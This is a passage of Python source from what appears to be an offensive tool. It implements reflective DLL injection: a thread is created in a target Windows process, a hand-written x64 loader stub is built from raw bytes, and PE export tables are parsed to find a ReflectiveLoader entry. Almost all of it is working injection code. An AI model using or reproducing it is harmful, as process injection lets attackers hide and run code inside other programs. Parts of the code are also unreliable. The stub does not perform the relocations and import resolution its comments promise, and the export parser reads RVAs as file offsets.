                loader_offset = self._find_reflective_loader_offset(reflective_payload)

                # Calculate loader entry point
                loader_addr = remote_base + loader_offset

                # Create remote thread at ReflectiveLoader entry point
                thread_id = ctypes.wintypes.DWORD()
                h_thread = kernel32.CreateRemoteThread(
                    h_process,
                    None,  # Security attributes
                    0,  # Stack size
                    loader_addr,  # ReflectiveLoader address
                    remote_base,  # DLL base as parameter
                    0,  # Creation flags
                    ctypes.byref(thread_id),
                )

                if not h_thread:
                    raise Exception(f"Failed to create remote thread: {kernel32.GetLastError()}")

                # Wait for loader to complete (with timeout)
                WAIT_TIMEOUT = 0x00000102
                wait_result = kernel32.WaitForSingleObject(h_thread, 5000)  # 5 second timeout

                # Get exit code
                exit_code = ctypes.wintypes.DWORD()
                kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))
                kernel32.CloseHandle(h_thread)

                return {
                    "success": True,
                    "method": "reflective_dll_injection",
                    "process_id": process_id,
                    "thread_id": thread_id.value,
                    "remote_base": hex(remote_base),
                    "loader_offset": hex(loader_offset),
                    "loader_addr": hex(loader_addr),
                    "payload_size": payload_size,
                    "exit_code": hex(exit_code.value) if wait_result != WAIT_TIMEOUT else "timeout",
                    "memory_allocated": True,
                    "loader_executed": True,
                }

            finally:
                kernel32.CloseHandle(h_process)

        except ImportError as e:
            logger.error("Windows APIs not available: %s", e)
            return {"success": False, "error": f"Windows APIs not available: {e}", "method": "reflective_dll_injection"}
        except Exception as e:
            logger.error("Reflective DLL injection failed: %s", e)
            return {"success": False, "error": str(e), "method": "reflective_dll_injection"}

    def _prepare_reflective_dll(self, payload: bytes) -> bytes:
        """Prepare a reflective DLL payload with loader stub."""
        import struct

        # Check if payload already has reflective loader
        if self._has_reflective_loader(payload):
            return payload

        # Generate x64 reflective loader stub
        # This loader will:
        # 1. Find its own base address
        # 2. Parse PE headers
        # 3. Perform relocations
        # 4. Resolve imports
        # 5. Call DllMain

        loader_stub = bytearray(
            [
                # Save registers
                0x50,  # push rax
                0x53,  # push rbx
                0x51,  # push rcx
                0x52,  # push rdx
                0x56,  # push rsi
                0x57,  # push rdi
                0x55,  # push rbp
                0x41,
                0x50,  # push r8
                0x41,
                0x51,  # push r9
                # Get current address (call $+5; pop rbx)
                0xE8,
                0x00,
                0x00,
                0x00,
                0x00,  # call $+5
                0x5B,  # pop rbx
                # Calculate image base (rbx now contains current RIP)
                0x48,
                0x83,
                0xEB,
                0x05,  # sub rbx, 5 (adjust for call)
                # Find DOS header (search backwards for MZ)
                0x48,
                0x89,
                0xDF,  # mov rdi, rbx
                # Loop to find MZ signature
                0x48,
                0x81,
                0xEF,
                0x00,
                0x10,
                0x00,
                0x00,  # sub rdi, 0x1000
                0x66,
                0x81,
                0x3F,
                0x4D,
                0x5A,  # cmp word [rdi], 'MZ'
                0x75,
                0xF2,  # jne -14 (loop)
                # rdi now points to DOS header
                0x48,
                0x89,
                0xFE,  # mov rsi, rdi (save base)
                # Get NT headers offset
                0x48,
                0x63,
                0x47,
                0x3C,  # movsxd rax, dword [rdi+0x3C]
                0x48,
                0x01,
                0xF8,  # add rax, rdi
                # Verify PE signature
                0x81,
                0x38,
                0x50,
                0x45,
                0x00,
                0x00,  # cmp dword [rax], 'PE\0\0'
                0x75,
                0x30,  # jne error
                # Process import table
                0x48,
                0x8B,
                0x80,
                0x90,
                0x00,
                0x00,
                0x00,  # mov rax, [rax+0x90] (import table RVA)
                0x48,
                0x01,
                0xF0,  # add rax, rsi (convert to VA)
                # Call DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
                0x48,
                0x89,
                0xF1,  # mov rcx, rsi (hModule)
                0xBA,
                0x01,
                0x00,
                0x00,
                0x00,  # mov edx, 1 (DLL_PROCESS_ATTACH)
                0x45,
                0x31,
                0xC0,  # xor r8d, r8d (NULL)
                # Find entry point
                0x48,
                0x89,
                0xF0,  # mov rax, rsi
                0x48,
                0x63,
                0x4E,
                0x3C,  # movsxd rcx, dword [rsi+0x3C]
                0x48,
                0x01,
                0xF1,  # add rcx, rsi
                0x8B,
                0x41,
                0x28,  # mov eax, [rcx+0x28] (entry point RVA)
                0x48,
                0x01,
                0xF0,  # add rax, rsi
                0xFF,
                0xD0,  # call rax
                # Restore registers
                0x41,
                0x59,  # pop r9
                0x41,
                0x58,  # pop r8
                0x5D,  # pop rbp
                0x5F,  # pop rdi
                0x5E,  # pop rsi
                0x5A,  # pop rdx
                0x59,  # pop rcx
                0x5B,  # pop rbx
                0x58,  # pop rax
                # Return
                0xC3,  # ret
            ]
        )

        # Combine loader stub with original payload
        # Place loader at beginning, followed by original DLL
        combined = bytearray()

        # Add jump to loader at entry point
        combined.extend(loader_stub)

        # Pad to align DLL start
        while len(combined) % 16 != 0:
            combined.append(0x90)  # nop padding

        loader_size = len(combined)

        # Append original DLL
        combined.extend(payload)

        # Update entry point in PE header to point to loader
        if len(payload) > 0x40:
            pe_offset = struct.unpack("<I", payload[0x3C:0x40])[0]
            if payload[pe_offset : pe_offset + 4] == b"PE\x00\x00":
                # Update entry point RVA
                entry_offset = pe_offset + 0x28
                combined[loader_size + entry_offset : loader_size + entry_offset + 4] = struct.pack("<I", 0)

        return bytes(combined)

    def _has_reflective_loader(self, payload: bytes) -> bool:
        """Check if payload already contains reflective loader."""
        # Look for ReflectiveLoader export or known signatures
        reflective_signatures = [
            b"ReflectiveLoader",
            b"ReflectiveDllMain",
            b"_ReflectiveLoader@4",
            # Assembly patterns for self-location
            bytes([0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B]),  # call $+5; pop rbx
            bytes([0xE8, 0x00, 0x00, 0x00, 0x00, 0x58]),  # call $+5; pop rax
        ]

        for sig in reflective_signatures:
            if sig in payload:
                return True

        return False

    def _find_reflective_loader_offset(self, payload: bytes) -> int:
        """Find the offset of ReflectiveLoader export in the DLL."""
        import struct

        # If we added our own loader, it's at the beginning
        if payload[:2] == bytes([0x50, 0x53]):  # Our loader signature
            return 0

        # Otherwise, parse PE export table to find ReflectiveLoader
        if len(payload) < 0x40:
            return 0

        # Check DOS header
        if payload[0:2] != b"MZ":
            return 0

        # Get PE header offset
        pe_offset = struct.unpack("<I", payload[0x3C:0x40])[0]
        if pe_offset + 0x18 > len(payload):
            return 0

        # Check PE signature
        if payload[pe_offset : pe_offset + 4] != b"PE\x00\x00":
            return 0

        # Get optional header size
        optional_header_offset = pe_offset + 0x18
        optional_header_size = struct.unpack("<H", payload[pe_offset + 0x14 : pe_offset + 0x16])[0]

        if optional_header_offset + optional_header_size > len(payload):
            return 0

        # Check magic (PE32 or PE32+)
        magic = struct.unpack("<H", payload[optional_header_offset : optional_header_offset + 2])[0]

        if magic == 0x10B:  # PE32
            export_table_offset = optional_header_offset + 0x60
        elif magic == 0x20B:  # PE32+
            export_table_offset = optional_header_offset + 0x70
        else:
            return 0

        if export_table_offset + 8 > len(payload):
            return 0

        # Get export table RVA and size
        export_rva = struct.unpack("<I", payload[export_table_offset : export_table_offset + 4])[0]
        export_size = struct.unpack("<I", payload[export_table_offset + 4 : export_table_offset + 8])[0]

        if export_rva == 0 or export_size == 0:
            # No export table, use entry point
            entry_point_offset = optional_header_offset + 0x10
            if entry_point_offset + 4 <= len(payload):
                return struct.unpack("<I", payload[entry_point_offset : entry_point_offset + 4])[0]
            return 0

        # Parse export directory
        if export_rva + 0x20 > len(payload):
            return 0

        num_functions = struct.unpack("<I", payload[export_rva + 0x14 : export_rva + 0x18])[0]
        num_names = struct.unpack("<I", payload[export_rva + 0x18 : export_rva + 0x1C])[0]
        functions_rva = struct.unpack("<I", payload[export_rva + 0x1C : export_rva + 0x20])[0]
        names_rva = struct.unpack("<I", payload[export_rva + 0x20 : export_rva + 0x24])[0]
        ordinals_rva = struct.unpack("<I", payload[export_rva + 0x24 : export_rva + 0x28])[0]

        # Search for ReflectiveLoader export
        for i in range(min(num_names, 1000)):  # Limit search
            name_rva_offset = names_rva + (i * 4)
            if name_rva_offset + 4 > len(payload):
                break

            name_rva = struct.unpack("<I", payload[name_rva_offset : name_rva_offset + 4])[0]
            if name_rva + 20 > len(payload):
                continue

            # Read export name
            name = payload[name_rva : name_rva + 20].split(b"\x00")[0]

            if b"ReflectiveLoader" in name or b"DllMain" in name:
                # Get function ordinal
                ordinal_offset = ordinals_rva + (i * 2)
                if ordinal_offset + 2 > len(payload):
                    continue

                ordinal = struct.unpack("<H", payload[ordinal_offset : ordinal_offset + 2])[0]

                # Get function RVA
                function_rva_offset = functions_rva + (ordinal * 4)
                if function_rva_offset + 4 > len(payload):
                    continue

                function_rva = struct.unpack("<I", payload[function_rva_offset : function_rva_offset + 4])[0]
                return function_rva

        # Default to entry point if ReflectiveLoader not found
        entry_point_offset = optional_header_offset + 0x10
        if entry_point_offset + 4 <= len(payload):
            return struct.unpack("<I", payload[entry_point_offset : entry_point_offset + 4])[0]

        return 0
